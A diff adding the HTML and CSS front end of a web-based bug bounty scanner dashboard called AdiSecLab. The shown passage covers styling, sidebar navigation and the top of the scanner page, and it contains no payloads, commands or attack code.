@@ -1,0 +1,1507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>AdiSecLab — Bug Bounty Platform</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#050810;--s1:#080d1a;--s2:#0c1326;--s3:#111d35;
+  --b1:rgba(255,255,255,.06);--b2:rgba(255,255,255,.12);
+  --cy:#00d4ff;--cyd:rgba(0,212,255,.1);
+  --re:#ff4560;--red:rgba(255,69,96,.1);
+  --or:#ff7b00;--ye:#ffd60a;
+  --gr:#00e5a0;--grd:rgba(0,229,160,.1);
+  --vi:#7c6aff;--vid:rgba(124,106,255,.12);
+  --t1:#f0f4ff;--t2:#8fa3c0;--t3:#4d6480;
+  --r1:10px;--r2:6px;
+  --mono:'JetBrains Mono',monospace;
+  --disp:'Syne',sans-serif;
+  --body:'Inter',sans-serif;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{background:var(--bg);color:var(--t1);font-family:var(--body);overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{text-decoration:none;color:inherit}
+button{cursor:pointer;font-family:var(--body)}
+
+/* AMBIENT */
+.amb{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:radial-gradient(ellipse 700px 400px at 15% -5%,rgba(0,212,255,.04) 0%,transparent 70%),
+             radial-gradient(ellipse 500px 350px at 85% 110%,rgba(124,106,255,.04) 0%,transparent 70%)}
+.gridbg{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:linear-gradient(var(--b1) 1px,transparent 1px),linear-gradient(90deg,var(--b1) 1px,transparent 1px);
+  background-size:44px 44px;opacity:.35}
+
+/* LAYOUT */
+.wrap{position:relative;z-index:1;display:flex;min-height:100vh}
+
+/* SIDEBAR */
+.sidebar{width:220px;flex-shrink:0;background:var(--s1);border-right:1px solid var(--b1);
+  display:flex;flex-direction:column;position:fixed;top:0;bottom:0;left:0;z-index:100;
+  overflow-y:auto;transition:transform .26s ease}
+.sb-logo{padding:20px 16px 16px;border-bottom:1px solid var(--b1);flex-shrink:0}
+.sb-mark{display:flex;align-items:center;gap:9px;margin-bottom:4px}
+.sb-hex{width:34px;height:34px;border:1.5px solid var(--cy);border-radius:8px;display:flex;
+  align-items:center;justify-content:center;font-family:var(--disp);font-weight:800;font-size:15px;
+  color:var(--cy);background:var(--cyd);flex-shrink:0;box-shadow:0 0 14px rgba(0,212,255,.15)}
+.sb-word{font-family:var(--disp);font-size:16px;font-weight:800;color:var(--t1)}
+.sb-tag{font-family:var(--mono);font-size:9px;color:var(--t3);letter-spacing:2px;text-transform:uppercase;margin-bottom:7px}
+.sb-ver{display:inline-block;font-family:var(--mono);font-size:9px;padding:2px 8px;border-radius:10px;
+  background:var(--cyd);color:var(--cy);border:1px solid rgba(0,212,255,.2)}
+.sb-sec{padding:12px 16px 4px;font-family:var(--mono);font-size:9px;color:var(--t3);letter-spacing:2px;text-transform:uppercase;flex-shrink:0}
+.nav-btn{display:flex;align-items:center;gap:8px;padding:9px 13px;margin:1px 7px;
+  border-radius:var(--r2);border:1px solid transparent;font-size:13px;font-weight:500;
+  color:var(--t2);background:transparent;transition:all .15s;width:calc(100% - 14px);
+  text-align:left;position:relative;white-space:nowrap}
+.nav-btn:hover{background:var(--s2);color:var(--t1)}
+.nav-btn.on{background:var(--cyd);color:var(--cy);border-color:rgba(0,212,255,.15)}
+.nav-btn.on::before{content:'';position:absolute;left:-7px;top:50%;transform:translateY(-50%);
+  width:3px;height:16px;background:var(--cy);border-radius:0 2px 2px 0;box-shadow:0 0 6px var(--cy)}
+.nav-ico{font-size:14px;width:18px;text-align:center;flex-shrink:0}
+.nav-bdg{margin-left:auto;font-family:var(--mono);font-size:9px;padding:1px 6px;
+  border-radius:8px;background:var(--red);color:var(--re);border:1px solid rgba(255,69,96,.2)}
+.sb-foot{margin-top:auto;padding:12px 9px;border-top:1px solid var(--b1);flex-shrink:0}
+.dev-card{display:flex;align-items:center;gap:8px;padding:10px 11px;background:var(--s2);
+  border-radius:var(--r1);border:1px solid var(--b1);transition:all .16s}
+.dev-card:hover{border-color:var(--b2);background:var(--s3)}
+.dev-av{width:30px;height:30px;border-radius:6px;background:linear-gradient(135deg,var(--cy),var(--vi));
+  display:flex;align-items:center;justify-content:center;font-family:var(--disp);font-size:11px;
+  font-weight:800;color:#000;flex-shrink:0}
+.dev-nm{font-size:12px;font-weight:600;color:var(--t1);line-height:1.2}
+.dev-rl{font-family:var(--mono);font-size:9px;color:var(--t3);letter-spacing:1px}
+
+/* MAIN */
+.main{margin-left:220px;flex:1;display:flex;flex-direction:column;min-height:100vh}
+.topbar{height:56px;display:flex;align-items:center;justify-content:space-between;
+  padding:0 24px;background:rgba(8,13,26,.9);border-bottom:1px solid var(--b1);
+  backdrop-filter:blur(10px);position:sticky;top:0;z-index:50;flex-shrink:0}
+.tb-l{display:flex;align-items:center;gap:7px;font-size:13px;color:var(--t2)}
+.tb-l strong{color:var(--t1);font-weight:600}
+.tb-sep{color:var(--t3)}
+.tb-r{display:flex;align-items:center;gap:11px}
+.sys-pill{display:flex;align-items:center;gap:5px;font-family:var(--mono);font-size:10px;
+  color:var(--gr);padding:4px 10px;border-radius:20px;background:var(--grd);border:1px solid rgba(0,229,160,.2)}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--gr);box-shadow:0 0 5px var(--gr);
+  animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+#clock{font-family:var(--mono);font-size:11px;color:var(--t3);letter-spacing:1px}
+
+/* PAGES */
+.page{display:none;padding:24px 24px 60px;animation:fin .18s ease}
+.page.on{display:block}
+@keyframes fin{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
+.pg-h{margin-bottom:22px}
+.pg-t{font-family:var(--disp);font-size:22px;font-weight:800;color:var(--t1);margin-bottom:4px}
+.pg-s{font-size:13px;color:var(--t2);line-height:1.5}
+
+/* CARD */
+.card{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r1);overflow:hidden;transition:border-color .15s}
+.card:hover{border-color:var(--b2)}
+.c-head{display:flex;align-items:center;justify-content:space-between;padding:11px 15px;
+  border-bottom:1px solid var(--b1);background:rgba(255,255,255,.01)}
+.c-title{display:flex;align-items:center;gap:6px;font-family:var(--mono);font-size:11px;
+  font-weight:600;color:var(--t2);letter-spacing:1px;text-transform:uppercase}
+.c-body{padding:15px}
+
+/* CHIP */
+.chip{display:inline-flex;align-items:center;font-family:var(--mono);font-size:10px;
+  padding:3px 9px;border-radius:20px;border:1px solid;letter-spacing:.5px;font-weight:500}
+.ch-cy{color:var(--cy);background:var(--cyd);border-color:rgba(0,212,255,.2)}
+.ch-re{color:var(--re);background:var(--red);border-color:rgba(255,69,96,.2)}
+.ch-gr{color:var(--gr);background:var(--grd);border-color:rgba(0,229,160,.2)}
+.ch-vi{color:var(--vi);background:var(--vid);border-color:rgba(124,106,255,.2)}
+
+/* GRID */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:15px}
+.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:15px}
+
+/* BUTTONS */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:5px;
+  padding:8px 16px;border-radius:var(--r2);font-size:13px;font-weight:600;
+  border:1px solid transparent;transition:all .15s;white-space:nowrap;line-height:1}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.b-cy{background:var(--cy);color:#050810;border-color:var(--cy);box-shadow:0 2px 12px rgba(0,212,255,.2)}
+.b-cy:hover{background:#22ddff;box-shadow:0 2px 20px rgba(0,212,255,.35);transform:translateY(-1px)}
+.b-gh{background:transparent;color:var(--t2);border-color:var(--b2)}
+.b-gh:hover{background:var(--s2);color:var(--t1);border-color:rgba(255,255,255,.18)}
+.b-re{background:var(--red);color:var(--re);border-color:rgba(255,69,96,.25)}
+.b-re:hover{background:rgba(255,69,96,.18)}
+.b-pdf{background:rgba(255,69,96,.08);color:#ff6090;border-color:rgba(255,69,96,.3)}
+.b-pdf:hover{background:rgba(255,69,96,.16)}
+.b-scan{background:var(--cy);color:#050810;border-color:var(--cy);padding:10px 22px;font-size:14px;
+  box-shadow:0 2px 14px rgba(0,212,255,.25)}
+.b-scan:hover{background:#22ddff;box-shadow:0 2px 22px rgba(0,212,255,.4);transform:translateY(-1px)}
+.b-stop{background:var(--re);border-color:var(--re);color:#fff;
+  box-shadow:0 2px 14px rgba(255,69,96,.3);animation:scanp 2s ease-in-out infinite}
+@keyframes scanp{0%,100%{box-shadow:0 2px 14px rgba(255,69,96,.3)}50%{box-shadow:0 2px 24px rgba(255,69,96,.55)}}
+.b-sm{padding:6px 13px;font-size:12px}
+.b-xs{padding:4px 9px;font-size:11px}
+
+/* SCAN BAR */
+.scan-bar{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r1);
+  padding:18px 18px 15px;margin-bottom:16px;position:relative;overflow:hidden}
+.scan-bar::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,transparent,var(--cy),var(--vi),transparent);opacity:.5}
+.s-label{font-family:var(--mono);font-size:9px;color:var(--t3);letter-spacing:2px;text-transform:uppercase;margin-bottom:7px}
+.s-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.s-inp{flex:1;min-width:240px;background:var(--s2);border:1px solid var(--b2);border-radius:var(--r2);
+  padding:10px 13px;font-family:var(--mono);font-size:13px;color:var(--cy);outline:none;
+  transition:all .18s;caret-color:var(--cy)}
+.s-inp:focus{border-color:rgba(0,212,255,.4);background:var(--s3);box-shadow:0 0 0 3px rgba(0,212,255,.06)}
+.s-inp::placeholder{color:var(--t3)}
+.mode-row{display:flex;gap:6px;flex-wrap:wrap;margin-top:11px}
+.mdbtn{padding:5px 12px;border-radius:20px;font-size:12px;font-weight:500;
+  border:1px solid var(--b2);color:var(--t2);background:transparent;transition:all .15s}
+.mdbtn:hover{color:var(--t1)}
+.mdbtn.on{font-weight:700}
+.md-r.on{background:var(--cyd);color:var(--cy);border-color:rgba(0,212,255,.3)}
+.md-v.on{background:var(--red);color:var(--re);border-color:rgba(255,69,96,.3)}
+.md-f.on{background:rgba(255,123,0,.1);color:var(--or);border-color:rgba(255,123,0,.3)}
+.md-o.on{background:var(--vid);color:var(--vi);border-color:rgba(124,106,255,.3)}
+.md-a.on{background:rgba(255,214,10,.08);color:var(--ye);border-color:rgba(255,214,10,.25)}
+.md-g.on{background:linear-gradient(90deg,var(--cyd),var(--vid));color:var(--t1);border-color:rgba(0,212,255,.3)}
+
+/* STATS */
+.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:11px;margin-bottom:16px}
+.sc{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r1);padding:14px 15px;
+  position:relative;overflow:hidden;transition:all .18s}
+.sc:hover{border-color:var(--b2);transform:translateY(-2px)}
+.sc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px}
+.sc-c::after{background:linear-gradient(90deg,transparent,var(--re),transparent)}
+.sc-h::after{background:linear-gradient(90deg,transparent,var(--or),transparent)}
+.sc-m::after{background:linear-gradient(90deg,transparent,var(--ye),transparent)}
+.sc-l::after{background:linear-gradient(90deg,transparent,var(--gr),transparent)}
+.sc-i::after{background:linear-gradient(90deg,transparent,var(--cy),transparent)}
+.sc-n{font-family:var(--disp);font-size:32px;font-weight:800;line-height:1;margin-bottom:4px}
+.sc-c .sc-n{color:var(--re)}.sc-h .sc-n{color:var(--or)}.sc-m .sc-n{color:var(--ye)}
+.sc-l .sc-n{color:var(--gr)}.sc-i .sc-n{color:var(--cy)}
+.sc-lb{font-size:10px;color:var(--t3);text-transform:uppercase;letter-spacing:1px}
+.sc-ico{position:absolute;top:11px;right:11px;font-size:18px;opacity:.1}
+
+/* PROGRESS */
+.prog{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r1);
+  padding:16px 18px;margin-bottom:16px;display:none}
+.prog.on{display:block}
+.prog-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:9px}
+.prog-l{display:flex;align-items:center;gap:8px}
+.spin{width:13px;height:13px;border:2px solid var(--b2);border-top-color:var(--cy);
+  border-radius:50%;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.prog-lbl{font-family:var(--mono);font-size:10px;color:var(--t2);letter-spacing:1.5px;text-transform:uppercase}
+.prog-pct{font-family:var(--disp);font-size:20px;font-weight:800;color:var(--cy)}
+.prog-track{height:4px;background:var(--s3);border-radius:2px;overflow:hidden;margin-bottom:11px}
+.prog-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--vi),var(--cy));
+  width:0%;transition:width .3s ease}
+.steps{display:flex;gap:4px;flex-wrap:wrap}
+.step{font-family:var(--mono);font-size:9px;padding:2px 6px;border-radius:3px;
+  border:1px solid var(--b1);color:var(--t3);transition:all .2s;letter-spacing:.5px}
+.step.done{border-color:rgba(0,229,160,.3);color:var(--gr);background:var(--grd)}
+.step.run{border-color:rgba(0,212,255,.3);color:var(--cy);background:var(--cyd);
+  animation:sb .8s ease-in-out infinite}
+@keyframes sb{0%,100%{opacity:1}50%{opacity:.45}}
+
+/* TERMINAL */
+.term{background:#020508;border:1px solid var(--b1);border-radius:var(--r1);overflow:hidden;margin-bottom:16px}
+.term-bar{display:flex;align-items:center;gap:5px;padding:8px 12px;
+  background:var(--s1);border-bottom:1px solid var(--b1)}
+.td{width:10px;height:10px;border-radius:50%}
+.td-r{background:#ff5f57}.td-y{background:#febc2e}.td-g{background:#28c840}
+.term-ttl{font-family:var(--mono);font-size:11px;color:var(--t3);margin-left:7px;flex:1}
+.term-acts{display:flex;gap:5px}
+.tbtn{font-family:var(--mono);font-size:10px;padding:3px 8px;border-radius:4px;
+  background:transparent;border:1px solid var(--b2);color:var(--t3);transition:all .14s}
+.tbtn:hover{color:var(--t1);border-color:var(--b2)}
+.term-body{height:260px;overflow-y:auto;padding:11px 13px;font-family:var(--mono);
+  font-size:12px;line-height:1.9;scrollbar-width:thin;scrollbar-color:var(--s3) transparent}
+.term-body::-webkit-scrollbar{width:3px}
+.term-body::-webkit-scrollbar-thumb{background:var(--s3);border-radius:2px}
+.tl{display:flex;gap:8px;align-items:flex-start}
+.tts{color:var(--t3);font-size:10px;flex-shrink:0;padding-top:2px;min-width:52px}
+.ttag{font-size:9px;font-weight:700;padding:2px 5px;border-radius:3px;flex-shrink:0;letter-spacing:.5px}
+.t-sys{background:var(--vid);color:var(--vi)}.t-inf{background:var(--cyd);color:var(--cy)}
+.t-ok{background:var(--grd);color:var(--gr)}.t-w{background:rgba(255,214,10,.08);color:var(--ye)}
+.t-cr{background:var(--red);color:var(--re)}
+.tmsg{color:var(--t1);flex:1;word-break:break-all;line-height:1.6}
+.h{color:var(--cy)}.r{color:var(--re)}.g{color:var(--gr)}.y{color:var(--ye)}.v{color:var(--vi)}.o{color:var(--or)}
+
+/* FINDINGS TABLE */
+.ftbl{width:100%;border-collapse:collapse}
+.ftbl thead tr{border-bottom:1px solid var(--b2)}
+.ftbl th{font-family:var(--mono);font-size:10px;color:var(--t3);letter-spacing:1.5px;
+  text-transform:uppercase;padding:9px 13px;text-align:left;font-weight:500}
+.ftbl tbody tr{border-bottom:1px solid var(--b1);transition:background .12s}
+.ftbl tbody tr:hover{background:var(--s2)}
+.ftbl tbody tr:last-child{border-bottom:none}
+.ftbl td{padding:11px 13px;vertical-align:top}
+.sv{display:inline-flex;align-items:center;padding:3px 8px;border-radius:4px;
+  font-size:10px;font-weight:700;font-family:var(--mono);letter-spacing:.5px;border:1px solid;white-space:nowrap}
+.sv-c{background:var(--red);color:var(--re);border-color:rgba(255,69,96,.3)}
+.sv-h{background:rgba(255,123,0,.1);color:var(--or);border-color:rgba(255,123,0,.3)}
+.sv-m{background:rgba(255,214,10,.08);color:var(--ye);border-color:rgba(255,214,10,.25)}
+.sv-l{background:var(--grd);color:var(--gr);border-color:rgba(0,229,160,.25)}
+.sv-i{background:var(--cyd);color:var(--cy);border-color:rgba(0,212,255,.2)}
+.fn{color:var(--t1);font-weight:500;font-size:13px;margin-bottom:2px}
+.fu{font-family:var(--mono);font-size:10px;color:var(--t3);margin-bottom:3px}
+.fd{font-size:11px;color:var(--t2);line-height:1.5}
+.empty{text-align:center;padding:46px 20px;color:var(--t3)}
+.empty .ei{font-size:34px;margin-bottom:11px;opacity:.3}
+.empty p{font-size:13px}
+
+/* EXPORT BAR */
+.xbar{display:flex;gap:8px;flex-wrap:wrap;padding:12px 15px;border-top:1px solid var(--b1);background:rgba(255,255,255,.01)}
+
+/* MODULES */
+.mod-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(192px,1fr));gap:8px}
+.mod{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r1);
+  padding:12px 14px;cursor:pointer;transition:all .15s;position:relative;overflow:hidden;user-select:none}
+.mod:hover{border-color:var(--b2);transform:translateY(-1px)}
+.mod.on{background:rgba(0,212,255,.03);border-color:rgba(0,212,255,.2)}
+.mod.on.cr{background:rgba(255,69,96,.03);border-color:rgba(255,69,96,.2)}
+.mod.on::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--cy);opacity:.6}
+.mod.on.cr::before{background:var(--re)}
+.mod-hd{display:flex;align-items:flex-start;justify-content:space-between;gap:7px;margin-bottom:7px}
+.mod-ic{font-size:16px}
+.tsw{width:26px;height:14px;background:var(--s3);border-radius:7px;position:relative;
+  flex-shrink:0;border:1px solid var(--b2);transition:all .18s}
+.tsw::after{content:'';position:absolute;top:2px;left:2px;width:8px;height:8px;
+  border-radius:50%;background:var(--t3);transition:all .18s}
+.mod.on .tsw{background:var(--cyd);border-color:rgba(0,212,255,.3)}
+.mod.on .tsw::after{left:14px;background:var(--cy)}
+.mod.on.cr .tsw{background:var(--red);border-color:rgba(255,69,96,.3)}
+.mod.on.cr .tsw::after{left:14px;background:var(--re)}
+.mod-nm{font-size:12px;font-weight:600;color:var(--t1);margin-bottom:2px}
+.mod-ds{font-size:11px;color:var(--t3);line-height:1.4}
+
+/* COMMANDS */
+.cmd-pre{background:#020508;padding:12px 14px;font-family:var(--mono);font-size:12px;
+  line-height:1.8;color:var(--gr);overflow-x:auto;white-space:pre;tab-size:2}
+.cmd-hd{display:flex;align-items:center;justify-content:space-between;
+  padding:9px 14px;border-bottom:1px solid var(--b1);background:rgba(255,255,255,.01)}
+.cmd-cat{font-family:var(--mono);font-size:11px;font-weight:600;color:var(--t2);letter-spacing:1px}
+.cpbtn{font-family:var(--mono);font-size:10px;padding:3px 9px;border-radius:4px;
+  background:var(--cyd);border:1px solid rgba(0,212,255,.2);color:var(--cy);transition:all .14s}
+.cpbtn:hover{background:rgba(0,212,255,.18)}
+
+/* TOOLS */
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(198px,1fr));gap:8px}
+.tool-item{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r1);
+  padding:12px 14px;transition:all .15s}
+.tool-item:hover{border-color:var(--b2);transform:translateY(-1px)}
+.tool-nm{font-family:var(--mono);font-size:13px;font-weight:600;color:var(--cy);margin-bottom:3px}
+.tool-ds{font-size:11px;color:var(--t3);line-height:1.4;margin-bottom:6px}
+.tool-cat{font-family:var(--mono);font-size:9px;padding:2px 7px;border-radius:3px;
+  background:var(--vid);color:var(--vi);border:1px solid rgba(124,106,255,.2)}
+
+/* CONFIG */
+.cfg-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.cfg-f{display:flex;flex-direction:column;gap:5px}
+.cfg-lb{font-family:var(--mono);font-size:10px;color:var(--t3);letter-spacing:1.5px;text-transform:uppercase}
+.cfg-in,.cfg-sl{background:var(--s2);border:1px solid var(--b2);border-radius:var(--r2);
+  padding:8px 12px;font-family:var(--mono);font-size:12px;color:var(--t1);outline:none;
+  transition:all .18s;width:100%}
+.cfg-in:focus,.cfg-sl:focus{border-color:rgba(0,212,255,.35);background:var(--s3)}
+.cfg-sl option{background:#0c1326}
+.itbl{width:100%;border-collapse:collapse}
+.itbl tr{border-bottom:1px solid var(--b1)}
+.itbl tr:last-child{border-bottom:none}
+.itbl td{padding:9px 13px;font-size:12px}
+.itbl td:first-child{font-family:var(--mono);color:var(--t3);font-size:10px;letter-spacing:1px;width:44%}
+
+/* PAYLOADS */
+.pl-sec{margin-bottom:16px}
+.pl-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(265px,1fr));gap:6px}
+.pl-chip{background:#020508;border:1px solid var(--b2);border-radius:var(--r2);
+  padding:8px 11px;font-family:var(--mono);font-size:11px;color:var(--gr);
+  cursor:pointer;transition:all .14s;word-break:break-all;line-height:1.5;white-space:pre-wrap}
+.pl-chip:hover{border-color:rgba(0,212,255,.3);background:rgba(0,212,255,.03);color:var(--cy)}
+.pl-chip:active{transform:scale(.98)}
+.pl-done{border-color:rgba(0,229,160,.4)!important;color:var(--gr)!important;background:var(--grd)!important}
+
+/* NOTES */
+.note-ta{width:100%;background:#020508;border:1px solid var(--b2);border-radius:var(--r2);
+  padding:11px 13px;font-family:var(--mono);font-size:12px;color:var(--gr);
+  line-height:1.7;resize:vertical;outline:none;transition:border-color .18s;caret-color:var(--cy)}
+.note-ta:focus{border-color:rgba(0,212,255,.35);box-shadow:0 0 0 3px rgba(0,212,255,.05)}
+.note-ta::placeholder{color:var(--t3);font-family:var(--mono)}
+
+/* ABOUT */
+.ab-hero{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r1);
+  padding:34px 30px;margin-bottom:16px;position:relative;overflow:hidden}
+.ab-hero::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;
+  background:linear-gradient(90deg,var(--cy),var(--vi),var(--re),var(--cy));
+  background-size:200% 100%;animation:gf 4s linear infinite}
+@keyframes gf{0%{background-position:0%}100%{background-position:200%}}
+.ab-lay{display:grid;grid-template-columns:auto 1fr;gap:28px;align-items:center;position:relative;z-index:1}
+.ab-av-w{display:flex;flex-direction:column;align-items:center;gap:10px}
+.ab-av{width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,#001a2e,#001525);
+  border:2px solid rgba(0,212,255,.25);display:flex;align-items:center;justify-content:center;
+  font-family:var(--disp);font-size:36px;font-weight:800;color:var(--cy);
+  box-shadow:0 0 30px rgba(0,212,255,.1)}
+.ab-onl{display:flex;align-items:center;gap:4px;font-family:var(--mono);font-size:10px;
+  color:var(--gr);padding:3px 9px;border-radius:20px;background:var(--grd);border:1px solid rgba(0,229,160,.2)}
+.ab-nm{font-family:var(--disp);font-size:28px;font-weight:800;color:var(--t1);line-height:1;margin-bottom:4px}
+.ab-tt{font-size:13px;color:var(--cy);font-weight:500;margin-bottom:10px}
+.ab-bio{font-size:13px;color:var(--t2);line-height:1.72;max-width:560px;margin-bottom:16px}
+.ab-lnks{display:flex;gap:8px;flex-wrap:wrap}
+.ab-ln{display:inline-flex;align-items:center;gap:6px;padding:8px 15px;border-radius:var(--r2);
+  font-size:13px;font-weight:600;border:1px solid;transition:all .16s}
+.al-li{background:rgba(10,102,194,.1);color:#3a9fd8;border-color:rgba(10,102,194,.3)}
+.al-li:hover{background:rgba(10,102,194,.2);transform:translateY(-1px)}
+.al-em{background:var(--cyd);color:var(--cy);border-color:rgba(0,212,255,.3)}
+.al-em:hover{background:rgba(0,212,255,.18);transform:translateY(-1px)}
+.ab-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:11px;margin-bottom:16px}
+.ast{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r1);
+  padding:15px;text-align:center;transition:all .18s}
+.ast:hover{border-color:var(--b2);transform:translateY(-2px)}
+.ast-n{font-family:var(--disp);font-size:26px;font-weight:800;color:var(--cy);margin-bottom:3px}
+.ast-l{font-size:10px;color:var(--t3);text-transform:uppercase;letter-spacing:1px}
+.sk-i{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r1);padding:13px}
+.sk-n{font-weight:600;font-size:13px;color:var(--t1);margin-bottom:6px}
+.sk-bar{height:4px;background:var(--s3);border-radius:2px;overflow:hidden;margin-bottom:3px}
+.sk-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--vi),var(--cy))}
+.sk-pct{font-family:var(--mono);font-size:10px;color:var(--t3)}
+.tp{display:inline-block;font-family:var(--mono);font-size:11px;padding:3px 9px;
+  border-radius:5px;background:var(--s2);border:1px solid var(--b2);color:var(--t2);margin:3px;transition:all .14s}
+.tp:hover{color:var(--cy);border-color:rgba(0,212,255,.25);background:var(--cyd)}
+
+/* MODAL */
+.modal{display:none;position:fixed;inset:0;z-index:999;
+  background:rgba(0,0,0,.8);backdrop-filter:blur(6px);overflow-y:auto}
+.modal.on{display:block}
+.modal-in{max-width:840px;margin:36px auto;padding:0 16px 48px}
+
+/* NOTIFS */
+#notifs{position:fixed;bottom:18px;right:18px;display:flex;flex-direction:column;gap:7px;z-index:9999;pointer-events:none}
+.notif{background:var(--s2);border:1px solid var(--b2);border-left:3px solid var(--cy);
+  border-radius:var(--r1);padding:10px 14px;font-size:12px;color:var(--t1);max-width:280px;
+  backdrop-filter:blur(12px);box-shadow:0 5px 18px rgba(0,0,0,.4);
+  animation:nin .2s ease;pointer-events:all}
+.notif.ok{border-left-color:var(--gr)}.notif.warn{border-left-color:var(--ye)}.notif.err{border-left-color:var(--re)}
+@keyframes nin{from{transform:translateX(16px);opacity:0}to{transform:translateX(0);opacity:1}}
+
+/* MOBILE */
+.mob-tog{display:none;position:fixed;top:10px;left:10px;z-index:200;
+  background:var(--s1);border:1px solid var(--b2);border-radius:var(--r2);
+  padding:7px 10px;font-size:15px;color:var(--t1)}
+@media(max-width:860px){
+  .sidebar{transform:translateX(-100%)}.sidebar.open{transform:translateX(0)}
+  .main{margin-left:0}.mob-tog{display:flex}
+  .topbar{padding-left:54px}
+  .g2{grid-template-columns:1fr}
+  .stats{grid-template-columns:repeat(3,1fr)}
+  .ab-lay{grid-template-columns:1fr}
+  .ab-stats{grid-template-columns:repeat(2,1fr)}
+}
+.hint{font-size:11px;color:var(--t3);margin-top:7px;font-style:italic}
+</style>
+</head>
+<body>
+<div class="amb"></div><div class="gridbg"></div>
+<button class="mob-tog" id="mob-tog">☰</button>
+
+<div class="wrap">
+<!-- SIDEBAR -->
+<nav class="sidebar" id="sidebar">
+  <div class="sb-logo">
+    <div class="sb-mark"><div class="sb-hex">A</div><div class="sb-word">AdiSecLab</div></div>
+    <div class="sb-tag">Bug Bounty Intelligence Platform</div>
+    <span class="sb-ver">v5.0 · 30+ Modules</span>
+  </div>
+  <div class="sb-sec">Scanner</div>
+  <button class="nav-btn on" data-page="scanner"><span class="nav-ico">⚡</span>Scanner</button>
+  <button class="nav-btn" data-page="modules"><span class="nav-ico">🔧</span>Modules<span class="nav-bdg" id="nb-m">12</span></button>
+  <button class="nav-btn" data-page="findings"><span class="nav-ico">🎯</span>Findings<span class="nav-bdg" id="nb-f" style="display:none">0</span></button>
+  <div class="sb-sec">Reference</div>
+  <button class="nav-btn" data-page="commands"><span class="nav-ico">💻</span>Commands</button>
+  <button class="nav-btn" data-page="payloads"><span class="nav-ico">💣</span>Payloads</button>
+  <button class="nav-btn" data-page="tools"><span class="nav-ico">🛠️</span>Tools</button>
+  <button class="nav-btn" data-page="notes"><span class="nav-ico">📝</span>Notebook</button>
+  <button class="nav-btn" data-page="config"><span class="nav-ico">⚙️</span>Config</button>
+  <div class="sb-sec">Info</div>
+  <button class="nav-btn" data-page="about"><span class="nav-ico">👤</span>About</button>
+  <div class="sb-foot">
+    <a href="https://www.linkedin.com/in/bhsoaleaditya/" target="_blank" class="dev-card">
+      <div class="dev-av">AB</div>
+      <div><div class="dev-nm">Aditya Bhosale</div><div class="dev-rl">SECURITY RESEARCHER</div></div>
+    </a>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<div class="main">
+  <header class="topbar">
+    <div class="tb-l"><span>AdiSecLab</span><span class="tb-sep">›</span><strong id="page-lbl">Scanner</strong></div>
+    <div class="tb-r">
+      <div class="sys-pill"><div class="dot"></div>READY</div>
+      <div id="clock">00:00:00</div>
+    </div>
+  </header>
+
+  <!-- SCANNER -->
+  <div class="page on" id="page-scanner">
+    <div class="pg-h"><div class="pg-t">⚡ Vulnerability Scanner</div><div class="pg-s">Enter a target and launch — all enabled modules run automatically.</div></div>
+    <div class="scan-bar">
+      <div class="s-label">Target</div>
+      <div class="s-row">
+        <input class="s-inp" id="target" placeholder="https://target.com  |  192.168.1.0/24  |  *.company.com">
+        <button class="btn b-scan" id="scan-btn">▶ Launch Scan</button>
+        <button class="btn b-gh" id="clear-btn">✕ Clear</button>
+        <button class="btn b-pdf b-sm" id="exp-top" style="display:none">📄 Export PDF</button>
+      </div>
+      <div class="mode-row" id="mode-row">
+        <button class="mdbtn md-r on" data-mode="Recon">🔍 Recon</button>
+        <button class="mdbtn md-v" data-mode="Vuln Scan">💉 Vuln Scan</button>
+        <button class="mdbtn md-f" data-mode="Fuzzing">🗂️ Fuzzing</button>
+        <button class="mdbtn md-o" data-mode="OSINT">🌐 OSINT</button>
+        <button class="mdbtn md-a" data-mode="API Audit">📡 API Audit</button>
+        <button class="mdbtn md-g" data-mode="God Mode">⚡ God Mode</button>
+      </div>
+    </div>
+    <div class="stats">
+      <div class="sc sc-c"><div class="sc-ico">🔥</div><div class="sc-n" id="s-c">0</div><div class="sc-lb">Critical</div></div>
+      <div class="sc sc-h"><div class="sc-ico">⚠️</div><div class="sc-n" id="s-h">0</div><div class="sc-lb">High</div></div>
